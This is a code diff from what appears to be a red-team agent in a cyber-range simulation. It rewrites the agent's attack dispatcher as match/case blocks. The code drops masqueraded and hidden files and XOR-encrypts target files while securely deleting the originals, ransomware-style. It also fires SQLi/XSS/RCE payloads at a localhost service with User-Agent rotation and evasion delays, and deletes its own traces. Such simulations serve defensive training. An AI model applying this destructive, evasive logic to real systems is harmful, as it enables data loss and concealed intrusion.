@@ -93,146 +93,145 @@ def engage_offense():
             # 3. EXECUTION
             impact = 0
             timestamp = int(_time())
-
-            # Optimization: Pre-calculate paths outside conditional logic if possible,
-            # but here filenames depend on action. We can optimize string formatting though.
             
-            if action == "T1046_RECON":
-                # Low Entropy Bait
-                fname = f"{TARGET_DIR}/malware_bait_{timestamp}.sh"
-                try: 
-                    with open(fname, 'w') as f: f.write("echo 'scan'")
-                    impact = 1
-                except: pass
-                
-            elif action == "T1027_OBFUSCATE":
-                # High Entropy Binary with Polymorphism
-                # 1. Base Name
-                fname = f"{TARGET_DIR}/malware_crypt_{timestamp}.bin"
-
-                # 2. Polymorphic Content (Random padding to change Hash)
-                # In real life, we'd mutate code. Here, we append junk.
-                padding_size = random.randint(1, 256)
-                payload = b"MALICIOUS_PAYLOAD" + os.urandom(1024) + os.urandom(padding_size)
-
-                try:
-                    with open(fname, 'wb') as f: f.write(payload)
-                    impact = 3
-                except: pass
-                
-            elif action == "T1003_ROOTKIT":
-                # Hidden File
-                fname = f"{TARGET_DIR}/.sys_shadow_{timestamp}"
-                try:
-                    with open(fname, 'w') as f: f.write("uid=0(root)")
-                    impact = 5
-                except: pass
-
-            elif action == "T1036_MASQUERADE":
-                # Use real malware name from intel feed
-                threat_intel, _ = threat_loader.load()
-                names = threat_intel.get('filenames', [])
-
-                if names:
-                    # Smart Masquerade: Try to match extension context if possible,
-                    # but for now just pick a random real malware name to confuse Blue
-                    fake_name = _choice(names)
-                    fake_name = os.path.basename(fake_name)
-
-                    # Ensure it has an extension, otherwise it looks suspicious if we just drop "malware"
-                    if '.' not in fake_name:
-                        fake_name += ".exe"
-
-                    fname = f"{TARGET_DIR}/{fake_name}"
+            # Optimization: Using Structural Pattern Matching (Python 3.10+)
+            match action:
+                case "T1046_RECON":
+                    # Low Entropy Bait
+                    fname = f"{TARGET_DIR}/malware_bait_{timestamp}.sh"
                     try:
-                        # Write random content to match the "file type" roughly in size?
-                        # No, just standard payload for now.
-                        with open(fname, 'w') as f: f.write("real_sample_simulation_payload")
-                        impact = 4
+                        with open(fname, 'w') as f: f.write("echo 'scan'")
+                        impact = 1
                     except: pass
-                else:
-                    # Fallback if no internet/feed data
-                    fname = f"{TARGET_DIR}/svchost.exe"
+
+                case "T1027_OBFUSCATE":
+                    # High Entropy Binary with Polymorphism
+                    # 1. Base Name
+                    fname = f"{TARGET_DIR}/malware_crypt_{timestamp}.bin"
+
+                    # 2. Polymorphic Content (Random padding to change Hash)
+                    # In real life, we'd mutate code. Here, we append junk.
+                    padding_size = random.randint(1, 256)
+                    payload = b"MALICIOUS_PAYLOAD" + os.urandom(1024) + os.urandom(padding_size)
+
                     try:
-                        with open(fname, 'w') as f: f.write("fake_service")
-                        impact = 2
+                        with open(fname, 'wb') as f: f.write(payload)
+                        impact = 3
                     except: pass
-                
-            elif action == "T1589_LURK":
-                impact = 0
 
-            elif action == "T1486_ENCRYPT":
-                # REAL Ransomware: XOR Encryption
-                try:
-                    files = [f.path for f in os.scandir(TARGET_DIR) if f.is_file() and not f.name.endswith('.enc')]
-                    if files:
-                        target = _choice(files)
+                case "T1003_ROOTKIT":
+                    # Hidden File
+                    fname = f"{TARGET_DIR}/.sys_shadow_{timestamp}"
+                    try:
+                        with open(fname, 'w') as f: f.write("uid=0(root)")
+                        impact = 5
+                    except: pass
 
-                        # Read - Encrypt - Write
-                        key = 0xAA # Simple XOR key
-                        with open(target, 'rb') as f: data = bytearray(f.read())
-                        for i in range(len(data)): data[i] ^= key
+                case "T1036_MASQUERADE":
+                    # Use real malware name from intel feed
+                    threat_intel, _ = threat_loader.load()
+                    names = threat_intel.get('filenames', [])
 
-                        new_name = target + ".enc"
-                        with open(new_name, 'wb') as f: f.write(data)
+                    if names:
+                        # Smart Masquerade: Try to match extension context if possible,
+                        # but for now just pick a random real malware name to confuse Blue
+                        fake_name = _choice(names)
+                        fake_name = os.path.basename(fake_name)
 
-                        utils.secure_delete(target) # Delete original
+                        # Ensure it has an extension, otherwise it looks suspicious if we just drop "malware"
+                        if '.' not in fake_name:
+                            fake_name += ".exe"
 
-                        logger.info(f"RANSOMWARE: Encrypted {os.path.basename(target)}")
-                        impact = 8
-                except: pass
+                        fname = f"{TARGET_DIR}/{fake_name}"
+                        try:
+                            # Write random content to match the "file type" roughly in size?
+                            # No, just standard payload for now.
+                            with open(fname, 'w') as f: f.write("real_sample_simulation_payload")
+                            impact = 4
+                        except: pass
+                    else:
+                        # Fallback if no internet/feed data
+                        fname = f"{TARGET_DIR}/svchost.exe"
+                        try:
+                            with open(fname, 'w') as f: f.write("fake_service")
+                            impact = 2
+                        except: pass
 
-            elif action == "T1070_CLEANUP":
-                # Anti-forensics: Delete logs or self
-                try:
-                    # Delete self-dropped scripts
-                    files = [f.path for f in os.scandir(TARGET_DIR) if f.name.startswith('malware_')]
-                    if files:
-                        target = _choice(files)
-                        utils.secure_delete(target)
-                        impact = 2 # Low impact but good for evasion
-                except: pass
+                case "T1589_LURK":
+                    impact = 0
 
-            elif action == "T1190_WEB_EXPLOIT":
-                # LIVE FIRE: Real HTTP Attack against localhost:5000
-                atype = _choice(["SQLi", "XSS", "RCE"])
-                payload = payload_gen.generate(atype)
+                case "T1486_ENCRYPT":
+                    # REAL Ransomware: XOR Encryption
+                    try:
+                        files = [f.path for f in os.scandir(TARGET_DIR) if f.is_file() and not f.name.endswith('.enc')]
+                        if files:
+                            target = _choice(files)
 
-                # Encode payload
-                encoded = urllib.parse.quote(payload)
-                url = f"http://127.0.0.1:5000/?q={encoded}"
+                            # Read - Encrypt - Write
+                            key = 0xAA # Simple XOR key
+                            with open(target, 'rb') as f: data = bytearray(f.read())
+                            for i in range(len(data)): data[i] ^= key
 
-                # Rotate User-Agents to evade simple blocks
-                ua = _choice(USER_AGENTS)
+                            new_name = target + ".enc"
+                            with open(new_name, 'wb') as f: f.write(data)
 
-                try:
-                    req = urllib.request.Request(url, headers={'User-Agent': ua})
-                    with urllib.request.urlopen(req, timeout=1) as response:
-                        if response.status == 200:
-                            reward += 10
-                            logger.info(f"ATTACK SUCCESS: Payload '{payload[:20]}...' executed (200 OK)")
+                            utils.secure_delete(target) # Delete original
+
+                            logger.info(f"RANSOMWARE: Encrypted {os.path.basename(target)}")
                             impact = 8
-                except urllib.error.HTTPError as e:
-                    if e.code == 403:
-                        reward -= 10 # Higher penalty for getting burned
-                        logger.warning("ATTACK BLOCKED: Target Adapted. Initiating 'Low and Slow' Evasion.")
-                        # Low and Slow: Sleep longer to let bucket/alert level decay
-                        time.sleep(5)
-                except Exception as e:
-                    pass
+                    except: pass
 
-            elif action == "T1003_CREDENTIAL_DUMPING":
-                # Simulated Credential Access
-                try:
-                    # Look for leaked DBs from successful SQLi
-                    dumps = [f.path for f in os.scandir(TARGET_DIR) if "leaked" in f.name]
-                    if dumps:
-                        logger.info("CREDENTIALS ACQUIRED from Previous Breach!")
-                        reward += 15
-                        # Steal and delete (simulated exfil)
-                        utils.secure_delete(dumps[0])
-                        impact = 9
-                except: pass
+                case "T1070_CLEANUP":
+                    # Anti-forensics: Delete logs or self
+                    try:
+                        # Delete self-dropped scripts
+                        files = [f.path for f in os.scandir(TARGET_DIR) if f.name.startswith('malware_')]
+                        if files:
+                            target = _choice(files)
+                            utils.secure_delete(target)
+                            impact = 2 # Low impact but good for evasion
+                    except: pass
+
+                case "T1190_WEB_EXPLOIT":
+                    # LIVE FIRE: Real HTTP Attack against localhost:5000
+                    atype = _choice(["SQLi", "XSS", "RCE"])
+                    payload = payload_gen.generate(atype)
+
+                    # Encode payload
+                    encoded = urllib.parse.quote(payload)
+                    url = f"http://127.0.0.1:5000/?q={encoded}"
+
+                    # Rotate User-Agents to evade simple blocks
+                    ua = _choice(USER_AGENTS)
+
+                    try:
+                        req = urllib.request.Request(url, headers={'User-Agent': ua})
+                        with urllib.request.urlopen(req, timeout=1) as response:
+                            if response.status == 200:
+                                reward += 10
+                                logger.info(f"ATTACK SUCCESS: Payload '{payload[:20]}...' executed (200 OK)")
+                                impact = 8
+                    except urllib.error.HTTPError as e:
+                        if e.code == 403:
+                            reward -= 10 # Higher penalty for getting burned
+                            logger.warning("ATTACK BLOCKED: Target Adapted. Initiating 'Low and Slow' Evasion.")
+                            # Low and Slow: Sleep longer to let bucket/alert level decay
+                            time.sleep(5)
+                    except Exception as e:
+                        pass
+
+                case "T1003_CREDENTIAL_DUMPING":
+                    # Simulated Credential Access
+                    try:
+                        # Look for leaked DBs from successful SQLi
+                        dumps = [f.path for f in os.scandir(TARGET_DIR) if "leaked" in f.name]
+                        if dumps:
+                            logger.info("CREDENTIALS ACQUIRED from Previous Breach!")
+                            reward += 15
+                            # Steal and delete (simulated exfil)
+                            utils.secure_delete(dumps[0])
+                            impact = 9
+                    except: pass
 
             # 4. REWARDS
             reward = 0
